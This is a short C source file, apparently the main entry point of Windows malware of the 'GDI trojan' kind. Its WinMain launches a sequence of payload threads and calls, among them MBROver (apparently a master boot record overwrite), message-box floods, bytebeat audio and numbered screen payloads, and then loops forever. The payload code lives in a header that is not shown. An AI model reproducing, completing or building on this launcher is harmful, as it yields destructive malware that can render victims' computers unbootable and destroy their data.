typedef struct IUnknown IUnknown;
#include <Windows.h>
#include "payloads.h"
#pragma warning


int __stdcall WinMain(HINSTANCE(a), HINSTANCE(b), LPSTR(c), int(d))
{
	Warning(0);
	CreateThread(0, 0, MBROver, 0, 0, 0);
	CreateThread(0, 0, bytebeat, 0, 0, 0);
	CreateThread(0, 0, Extra4, 0, 0, 0);
	CreateThread(0, 0, RandFuck, 0, 0, 0);
	Payload1(0);
	Payload2(0);
	Payload8(0);
	CreateThread(0, 0, MsgBoxes, 0, 0, 0);
	CreateThread(0, 0, bytebeat2, 0, 0, 0);
	Extra3(0);
	Payload9(0);
	CreateThread(0, 0, Extra, 0, 0, 0);
	CreateThread(0, 0, Extra2, 0, 0, 0);
	Payload10(0);
	CreateThread(0, 0, bytebeat3, 0, 0, 0);
	Payload11(0);
	Payload12(0);
	CreateThread(0, 0, bytebeat4, 0, 0, 0);
	Payload13(0);
	CreateThread(0, 0, Payload14, 0, 0, 0);
	CreateThread(0, 0, Payload15, 0, 0, 0);
	CreateThread(0, 0, bytebeat5, 0, 0, 0);

	while (1) {}
}

